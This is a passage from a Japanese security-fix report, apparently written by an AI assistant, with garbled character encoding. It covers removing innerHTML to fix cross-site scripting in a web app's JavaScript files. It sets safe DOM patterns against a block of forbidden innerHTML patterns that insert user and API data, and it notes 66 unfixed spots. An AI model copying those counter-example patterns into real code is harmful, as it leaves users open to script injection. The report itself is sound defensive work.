// ãƒ‘ã‚¿ãƒ¼ãƒ³1: å˜ç´”ãªãƒ†ã‚­ã‚¹ãƒˆè¡¨ç¤º
element.textContent = data.value;

// ãƒ‘ã‚¿ãƒ¼ãƒ³2: è¤‡é›‘ãªæ§‹é€ 
const container = document.createElement('div');
container.className = 'item';

const title = document.createElement('h3');
title.textContent = data.title;
container.appendChild(title);

const desc = document.createElement('p');
desc.textContent = data.description;
container.appendChild(desc);

element.appendChild(container);

// ãƒ‘ã‚¿ãƒ¼ãƒ³3: é…åˆ—ãƒ‡ãƒ¼ã‚¿
items.forEach(item => {
  const itemEl = createSecureElement('div', {
    className: 'item',
    textContent: item.name
  });
  listEl.appendChild(itemEl);
});
```

### âŒ ç¦æ­¢ãƒ‘ã‚¿ãƒ¼ãƒ³

```javascript
// âŒ innerHTML with user input
element.innerHTML = `<div>${userInput}</div>`;

// âŒ innerHTML with API data (æ½œåœ¨çš„ãƒªã‚¹ã‚¯)
element.innerHTML = `<div>${apiData.title}</div>`;

// âŒ Template literals with dynamic data
element.innerHTML = items.map(item => `
  <div>${item.name}</div>
`).join('');
```

---

## ä»Šå¾Œã®å¯¾å¿œ

### çŸ­æœŸ (1é€±é–“ä»¥å†…)

- [ ] **detail-pages.jsã®æ®‹ã‚Š66ç®‡æ‰€ã‚’ä¿®æ­£**
  - ãƒ‘ã‚¿ãƒ¼ãƒ³A: ãƒ¡ã‚¿æƒ…å ± (15ç®‡æ‰€)
  - ãƒ‘ã‚¿ãƒ¼ãƒ³B: ãƒ†ãƒ¼ãƒ–ãƒ«ç”Ÿæˆ (20ç®‡æ‰€)
  - ãƒ‘ã‚¿ãƒ¼ãƒ³C: ãƒªã‚¹ãƒˆç”Ÿæˆ (20ç®‡æ‰€)
  - ãƒ‘ã‚¿ãƒ¼ãƒ³D: ãƒ¢ãƒ¼ãƒ€ãƒ« (10ç®‡æ‰€)
  - ãã®ä»– (1ç®‡æ‰€)

- [ ] **è‡ªå‹•ãƒ†ã‚¹ãƒˆã‚¹ã‚¤ãƒ¼ãƒˆã®ä½œæˆ**
  - XSSæ”»æ’ƒãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ã£ãŸè‡ªå‹•ãƒ†ã‚¹ãƒˆ
  - Puppeteerã‚’ä½¿ã£ãŸE2Eãƒ†ã‚¹ãƒˆ
  - ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¬ã‚°ãƒ¬ãƒƒã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ

### ä¸­æœŸ (1ãƒ¶æœˆä»¥å†…)

- [ ] **ä»–ã®JavaScriptãƒ•ã‚¡ã‚¤ãƒ«ã®ç›£æŸ»**
  - app.js
  - app-v2.js
  - index.js
  - ãªã©å…¨JavaScriptãƒ•ã‚¡ã‚¤ãƒ«

- [ ] **Content Security Policy (CSP) ã®å°å…¥**
  ```html
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
  ```

- [ ] **ESLintãƒ«ãƒ¼ãƒ«ã®è¿½åŠ **
  ```json
  {
    "rules": {
      "no-unsanitized/property": "error",
      "no-unsanitized/method": "error"
    }
  }
  ```

### é•·æœŸ (ç¶™ç¶šçš„)

- [ ] **é–‹ç™ºè€…æ•™è‚²**
  - XSSã¨ã¯ä½•ã‹
  - å®‰å…¨ãªDOMæ“ä½œæ–¹æ³•
  - ã‚»ã‚­ãƒ¥ã‚¢ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³

- [ ] **ã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ“ãƒ¥ãƒ¼ãƒ—ãƒ­ã‚»ã‚¹ã®å¼·åŒ–**
  - `innerHTML`ä½¿ç”¨æ™‚ã¯å¿…ãšãƒ¬ãƒ“ãƒ¥ãƒ¼
  - ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆã®ä½œæˆ

- [ ] **å®šæœŸçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»**
  - å››åŠæœŸã”ã¨ã®ã‚³ãƒ¼ãƒ‰ã‚¹ã‚­ãƒ£ãƒ³
  - å¤–éƒ¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å°‚é–€å®¶ã«ã‚ˆã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ

---

## å½±éŸ¿ç¯„å›²

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¸ã®å½±éŸ¿

âœ… **ãƒã‚¸ãƒ†ã‚£ãƒ–ãªå½±éŸ¿**:
- XSSæ”»æ’ƒã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä¿è­·
- ãƒ‡ãƒ¼ã‚¿ã®å®Œå…¨æ€§ãŒä¿è¨¼ã•ã‚Œã‚‹
- ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã®ãƒªã‚¹ã‚¯ãŒå¤§å¹…ã«æ¸›å°‘

ğŸ”µ **æ©Ÿèƒ½ã¸ã®å½±éŸ¿**:
- æ—¢å­˜æ©Ÿèƒ½ã¯å…¨ã¦æ­£å¸¸å‹•ä½œ (UIã®è¡¨ç¤ºæ–¹æ³•ãŒå†…éƒ¨çš„ã«å¤‰æ›´ã•ã‚ŒãŸã ã‘)
- ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¸ã®å½±éŸ¿ã¯å¾®å° (createElementã¯innerHTMLã‚ˆã‚Šã‚ãšã‹ã«é«˜é€Ÿãªå ´åˆã‚‚ã‚ã‚‹)

### ã‚·ã‚¹ãƒ†ãƒ ã¸ã®å½±éŸ¿

âœ… **ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å‘ä¸Š**:
- OWASP Top 10ã®A03:2021 - Injectionæ”»æ’ƒã«å¯¾ã™ã‚‹é˜²å¾¡ãŒå¼·åŒ–
- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ãŒä¿å­˜ã•ã‚Œã¦ã„ã¦ã‚‚å®‰å…¨ã«è¡¨ç¤ºå¯èƒ½

âš ï¸ **ä»Šå¾Œã®é–‹ç™º**:
- æ–°è¦æ©Ÿèƒ½é–‹ç™ºæ™‚ã«innerHTMLã®ä½¿ç”¨ã‚’é¿ã‘ã‚‹
- dom-helpers.jsã®ãƒ˜ãƒ«ãƒ‘ãƒ¼é–¢æ•°ã‚’ç©æ¥µçš„ã«æ´»ç”¨

---

## ã¾ã¨ã‚

æœ¬ä¿®æ­£ã«ã‚ˆã‚Šã€Mirai Knowledge Systemsã®**XSSè„†å¼±æ€§ã‚’å¤§å¹…ã«å‰Šæ¸›**ã—ã¾ã—ãŸã€‚ç‰¹ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚„APIãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã™ã‚‹ä¸»è¦ãªç®‡æ‰€ã«ãŠã„ã¦ã€å±é™ºãª`innerHTML`ã‚’å®Œå…¨ã«æ’é™¤ã—ã€å®‰å…¨ãª`textContent`ãŠã‚ˆã³DOM APIã«ç½®ãæ›ãˆã¾ã—ãŸã€‚

### é”æˆäº‹é …

âœ… **3ã¤ã®ãƒ•ã‚¡ã‚¤ãƒ«ã§ innerHTML ã‚’å®Œå…¨å‰Šé™¤** (detail-loader.js, expert-consult-actions.js, sop-detail-functions.js)
âœ… **detail-pages.jsã®æœ€é‡è¦ç®‡æ‰€ã‚’ä¿®æ­£** (ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã€ã‚¿ã‚°ã€æ¦‚è¦è¡¨ç¤º)
âœ… **ã‚»ã‚­ãƒ¥ã‚¢DOMãƒ˜ãƒ«ãƒ‘ãƒ¼é–¢æ•°ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½œæˆ** (dom-helpers.js)
âœ… **XSSæ¤œè¨¼ãƒ†ã‚¹ãƒˆã§å…¨åˆæ ¼**
âœ… **ä¿®æ­£æ–¹é‡ã¨ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã‚’æ–‡æ›¸åŒ–**

### æ®‹å­˜ãƒªã‚¹ã‚¯

âš ï¸ **detail-pages.jsã«ç´„66ç®‡æ‰€ã®innerHTMLä½¿ç”¨ç®‡æ‰€ãŒæ®‹å­˜**
- å„ªå…ˆåº¦: **ä¸­ã€œé«˜**
- æ¨å¥¨å¯¾å¿œæœŸé™: **1é€±é–“ä»¥å†…**
- ä¿®æ­£æ–¹æ³•: æœ¬ãƒ¬ãƒãƒ¼ãƒˆã®ãƒ‘ã‚¿ãƒ¼ãƒ³ABCDã«å¾“ã£ã¦é †æ¬¡ä¿®æ­£

---

## å‚è€ƒè³‡æ–™

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Docs: Element.textContent](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent)
- [MDN Web Docs: Element.innerHTML Security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
- [Google: DOM-based XSS](https://www.google.com/about/appsecurity/learning/xss/)

---

**å ±å‘Šè€…**: Claude (Anthropic AI Assistant)
**æ‰¿èª**: [ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒªãƒ¼ãƒ€ãƒ¼å]
**æœ€çµ‚æ›´æ–°**: 2025-12-30
